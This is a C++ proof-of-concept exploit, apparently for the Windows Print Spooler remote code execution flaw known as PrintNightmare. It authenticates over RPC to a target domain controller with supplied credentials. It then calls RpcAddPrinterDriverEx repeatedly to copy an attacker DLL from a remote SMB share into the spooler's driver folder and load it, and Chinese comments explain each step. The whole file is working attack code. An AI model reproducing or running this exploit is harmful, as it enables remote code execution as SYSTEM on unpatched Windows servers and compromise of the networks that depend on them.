﻿#include <iostream>
#include "resource.h"
#include "my_rpc.h"
#include <xpsprint.h>
#include <fstream>
#define RPC_USE_NATIVE_WCHAR
#include <stdio.h>
#include <tchar.h>
#include  <io.h>
#include <Windows.h>
#include <memory>
#include <string.h>
#pragma comment(lib, "rpcrt4.lib")
using namespace std;

wchar_t uuid[MAX_PATH] = L"12345678-1234-abcd-ef00-0123456789ab";
WCHAR src_exp_path[0x200] = {0};
WCHAR dest_exp_path[0x200] = { 0 };
WCHAR exp_name[0x200] = { 0 };
WCHAR dc_ip[0x200] = { 0 };
WCHAR dc_path[0x200] = { 0 };
WCHAR username[0x200] = { 0 };
WCHAR password[0x200] = { 0 };

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle) {
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-abcd-ef00-0123456789ab", (RPC_WSTR)L"ncacn_ip_tcp",
		(RPC_WSTR)dc_ip, NULL, nullptr, &StringBinding);
	if (status == RPC_S_OK) {
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status) {
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_DELEGATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;

			_SEC_WINNT_AUTH_IDENTITY_A identity;
			identity.Domain = NULL;
			identity.DomainLength = 0;
			identity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
			identity.User = (unsigned char*)username;
			identity.UserLength = lstrlenW(username);
			identity.Password = (unsigned char*)password;
			identity.PasswordLength = lstrlenW(password);
			

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, &identity, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status) {
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
				printf("[+] Binding successful!! handle: %d\n", binding_handle);
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}


int wmain(int argc, wchar_t* argv[]) {
	if (argc != 5) {
		printf(".\\poc.exe dc_ip path_to_exp user_name password\n");
		printf("For example: \n");
		printf(".\\poc.exe  192.168.228.191 \\\\192.168.228.1\\test\\MyExploit.dll test 123 \n");
		return 0;
	}
	wsprintf(dc_ip, L"%s", argv[1]);
	wsprintf(dc_path, L"\\\\%s", argv[1]);
	wsprintf(src_exp_path, L"%s", argv[2]);
	wsprintf(exp_name, L"%s", wcsrchr(argv[2], '\\')+1);
	wsprintf(username, L"%s", argv[3]);
	wsprintf(password, L"%s", argv[4]);

	printf("[+] Get Info:\n");
	wprintf(L"[+] dc_ip: %s\n", dc_ip);
	wprintf(L"[+] dc_path: %s\n", dc_path);
	wprintf(L"[+] src_exp_path: %s\n", src_exp_path);
	wprintf(L"[+] exp_name: %s\n", exp_name);
	wprintf(L"[+] username: %s\n", username);
	wprintf(L"[+] password: %s\n\n", password);

	// 1. 設定 RPC 參數
	// 其中 pDriverPath 必須是 UNIDRV.DLL;
	// pConfigFile 是會被載入的檔案;
	// pDataFile 不會被載入，但是會被複製到 C:\Windows\System32\spool\drivers\x64\3\ 
	DRIVER_INFO_2 info;
	info.cVersion = 3;
	info.pConfigFile = (LPWSTR)L"C:\\Windows\\System32\\KernelBase.dll";
	info.pDataFile = src_exp_path;
	info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL";
	info.pEnvironment = (LPWSTR)L"Windows x64";
	info.pName = (LPWSTR)L"XDD";
	DRIVER_CONTAINER container_info;
	container_info.Level = 2;
	container_info.DriverInfo.Level2 = new DRIVER_INFO_2();
	container_info.DriverInfo.Level2->cVersion = 3;
	container_info.DriverInfo.Level2->pConfigFile = info.pConfigFile;
	container_info.DriverInfo.Level2->pDataFile = info.pDataFile;
	container_info.DriverInfo.Level2->pDriverPath = info.pDriverPath;
	container_info.DriverInfo.Level2->pEnvironment = info.pEnvironment;
	container_info.DriverInfo.Level2->pName = info.pName;

	// 2. 取得經過身分驗證的 Binding Handle
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);

	// 3. 傳送 RPC
	RpcTryExcept
	{
		DWORD hr;

		// 第一次會先把 pDataFile 檔案複製到 C:\Windows\System32\spool\drivers\x64\3\ ，原本的檔案則被放到 C:\Windows\System32\spool\drivers\x64\3\Old\1 
		// 第二次會把第一次被複製到 C:\Windows\System32\spool\drivers\x64\3\ 的檔案放到 C:\Windows\System32\spool\drivers\x64\3\Old\2\ 
		for (int i = 0; i < 2; i++) {
			hr = RpcAddPrinterDriverEx(handle,
				dc_path,
				&container_info,
				APD_COPY_ALL_FILES | 0x10 | 0x8000
			);
		}
		
		// 第三次會把 pConfigFile 改成第二次被放到 C:\Windows\System32\spool\drivers\x64\3\Old\2 的檔案 
		wsprintf(dest_exp_path, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Old\\2\\%s", exp_name);
		container_info.DriverInfo.Level2->pConfigFile = dest_exp_path;
		hr = RpcAddPrinterDriverEx(handle,
			dc_path,
			&container_info,
			APD_COPY_ALL_FILES | 0x10 | 0x8000
		);
		wprintf(L"[*] Try to load %s - ErrorCode %d\n", container_info.DriverInfo.Level2->pConfigFile,hr);
		if (hr == 0) return 0;
	}
	RpcExcept(1) {
		status = RpcExceptionCode();
		printf("RPC ERROR CODE %d\n", status);
	}
	RpcEndExcept
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len) {
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr) {
	free(ptr);
}